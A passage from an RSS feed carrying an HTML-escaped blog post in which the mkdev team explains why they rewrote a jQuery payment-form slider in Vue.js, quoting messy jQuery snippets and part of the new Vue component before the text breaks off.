<dc:identifier>https://zwischenzugs.com/2011/08/29/my-favourite-secret-weapon-strace/</dc:identifier>
</item>
<item>
<title>How and why we moved to Vue.js</title>
<link>https://mkdev.me/en/posts/how-and-why-mkdev-moved-to-vue-js</link>
<guid isPermaLink="true" >https://mkdev.me/en/posts/how-and-why-mkdev-moved-to-vue-js</guid>
<description>&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;Disclaimer: in this article the one who can’t stand the front-end and doesn’t know how to work with it, writes about working with it and choosing JavaScript framework, and why Vue.js is a great choice. You’ve been warned.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I’m very bad with the front-end and don’t like it. The rest of our team has the same feelings. We prefer to focus on the back-end and either outsource the front-end or do it dreadfully ourselves. Then we make it over miserably, again and again, as our co-founder Leonid Suschev doesn’t let us jerk around his designs.&lt;/p&gt;
&lt;p&gt;In early 2017 we almost solved the problem with the front-end, as we hired an expert who made the whole site over using &lt;a href=&quot;https://en.bem.info/&quot;&gt;BEM&lt;/a&gt;, proper grid etc. It’s nearly impossible to start using BEM for a three-year old project in a single sitting. We’re still working on that and when we’re done, we’ll tell about the result here.&lt;/p&gt;
&lt;p&gt;But when it came to the problem with our JavaScript code, we didn’t even try to solve it. Mkdev is not a single-page application; we don’t have a huge pile of interactive elements and complex visual editors. In some places we use datepicker, in some there’s a drag &amp;amp; drop technology to sort, for the articles we use the simplest Markdown. Everything is so boring, that we have used ready-made jQuery plug-ins for three years and haven’t given a damn about the rest. Until recently.&lt;/p&gt;
&lt;h3&gt;99 mistakes one can make while writing the code using jQuery&lt;/h3&gt;
&lt;p&gt;We have a payment form which can be seen in the profile of any mentor. There’s a slider to choose the amount of weeks in the form. The buttons are dynamically updated according to the slider. Take a break from reading and &lt;a href=&quot;https://mkdev.me/en/mentors/IvanShamatov#mentor-payment&quot;&gt;play around with this slider&lt;/a&gt; to see what we’re talking about.&lt;/p&gt;
&lt;p&gt;Did you? Do you see now how the form is updated according to the slider and the buttons and how the price is dynamically changed on the button? Well, over the years the front-end code of this form transformed into the most horrible thing the one can do with jQuery.&lt;/p&gt;
&lt;p&gt;Let’s have a look at some of the examples of this horror.&lt;/p&gt;
&lt;h4&gt;Far too many conditional statements&lt;/h4&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/dashboard/account&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#button-payment-block, .link-cancel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#payment-block, #mentor-payment__login-form-container&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#button-payment-block&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;splice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#button-payment-block&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Hideous string parsing&lt;/h4&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.payment-form__weekly-price'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.payment-form__weekly-price&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;current_price_for_week&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;number_of_days&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;splice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ˆ'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;current_price_for_week&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.payment-form__weekly-price'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Constant operations with DOM&lt;/h4&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;nx&quot;&gt;$cardForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$cardForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'input[type=submit]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;disabled&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.upgrade-block .upgrade__payment-block, .upgrade-block .upgrade__title, .upgrade-block .upgrade__info'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'#upgrade__payment-block--payment-button'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.upgrade-block'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'border'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'none'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There are 284 lines of such unbearable mingle, which is absolutely impossible to grasp for anybody. The added complication is that element IDs are not even close to the point of this element: &lt;code&gt;#upgrade__payment-block--payment-button&lt;/code&gt; might turn up to be a button to upgrade the subscrption or just a payment button. So go figure.&lt;/p&gt;
&lt;p&gt;So our dear reader hopefully got an idea about how enormous the disaster is.&lt;/p&gt;
&lt;h3&gt;Which JavaScript framework to choose&lt;/h3&gt;
&lt;p&gt;We were considering two options:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Rewriting all the code from scratch, using the same technologies, but doing it properly now;&lt;/li&gt;
&lt;li&gt;Choosing any library, which will allow us to write good code out-of-the-box.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;We were afraid that if we chose the first option, in a year we wouldn’t be able to understand our own code again. So we chose the second one. We needed a library or a framework, which:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Could be implemented iteratively, only for the smallest parts of frontend;&lt;/li&gt;
&lt;li&gt;Being out-of-the-box, would be powerful enough to solve all our problems without further ado;&lt;/li&gt;
&lt;li&gt;Would be simple enough to grasp it decently for a couple of weekend hours.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;We chose it right away and without any second thought. Frankly speaking, the choice was done right after we read the wonderful Ivan Shamatov’s article &lt;a href=&quot;https://mkdev.me/en/posts/rails-5-vue-js-how-to-stop-worrying-and-love-the-frontend&quot;&gt;Rails 5 &amp;amp; Vue.js: how to stop worrying and love the frontend&lt;/a&gt;. Looking through the documentation to Vue.js, I decided to give it a shot.&lt;/p&gt;
&lt;h3&gt;Webpacker, PostCSS, Babel, Yarn, go away&lt;/h3&gt;
&lt;p&gt;Taking the Ivan Shamatov’s advice into account, I ran Rails generator for all the trendy frontend things, hoping to implement webpack real quick. Unfortunately, it generated also babel and postcss on top that, which I didn’t plan to generate at all. Moreover, it turned out that I have to use Yarn now. On this stage I ran out of my patience so I just eliminated all the junk generated by Rails.&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;Stop saying that, Kirill! It’s not junk, these are the most important tools of the modern front-end development!!11&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Yean, I agree. I guess the time for ‘modern’ front-end development for mkdev code hasn’t come yet. The standard assets pipeline works fine for us, as well as loading the third-party js-libraries through Gems or adding vendor/assets. We hate implementing dozens of new technologies, just because it’s cool and trendy.&lt;/p&gt;
&lt;p&gt;I took &lt;a href=&quot;https://github.com/adambutler/vuejs-rails&quot;&gt;vuejs-rails&lt;/a&gt; and added another couple of libraries (e.g. for slider) directly to vendor/assets. This approach has its own disadvantages for sure, but they are not really significant at this time.&lt;/p&gt;
&lt;h3&gt;Falling in love with Vue.js&lt;/h3&gt;
&lt;p&gt;I’m not going to teach you how to use Vue.js – it has superior &lt;a href=&quot;https://vuejs.org/v2/guide/installation.html&quot;&gt;documentation&lt;/a&gt;. But if you want to master it (especially combined with Ruby on Rails), you should &lt;a href=&quot;https://mkdev.me/en/mentors/IvanShamatov&quot;&gt;hire Ivan Shamatov as your mentor&lt;/a&gt;. So in the rest of the article you’ll see how we implemented Vue.js to mkdev.me, our experience and feelings.&lt;/p&gt;
&lt;h4&gt;Learning curve of Vue.js&lt;/h4&gt;
&lt;p&gt;Having spent about 6-7 hours in total on Vue.js, I managed to completely rewrite the whole front-end part of our payment form using Vue.js and to send it to production. Not so shabby, keeping in mind that the technology is absolutely new for me.&lt;/p&gt;
&lt;h4&gt;Code in Vue.js is by far shorter and clearer&lt;/h4&gt;
&lt;p&gt;If we estimate the amount of code lines, we’ll see that payments.js has been cut to 166 lines. More than 30 of them are used for the slider component appearance. The component is nice, but it forces us to describe its appearance right in the js code for reasons unknown.&lt;/p&gt;
&lt;p&gt;This Vue.js component just defines its properties and methods. Without any unnecessary details, here’s how our payment form looks right now:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
 &lt;span class=&quot;nx&quot;&gt;Vue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'payment-form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#payment-form-template'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'initial_upgrade'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'mentor_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'initial_number_of_weeks'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'current_user_is_present'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'has_mentor'&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;coupon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;error_message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;final_form_visible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mentor_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Either login or card details form&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;loading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;number_of_weeks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial_number_of_weeks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;price&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;upgrade&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial_upgrade&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;upgrade_notice_visible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initial_upgrade&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;weekly_price&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;card&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;slider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;components&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'vueSlider'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'vue-slider-component'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'vueMaskedInput'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'VueTheMask'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;computed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;can_proceed_to_final_form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;number_of_weeks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;has_mentor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mentor_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;watch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;number_of_weeks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setPrice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;coupon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setPrice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;price&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;weekly_price&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;price&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;number_of_weeks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
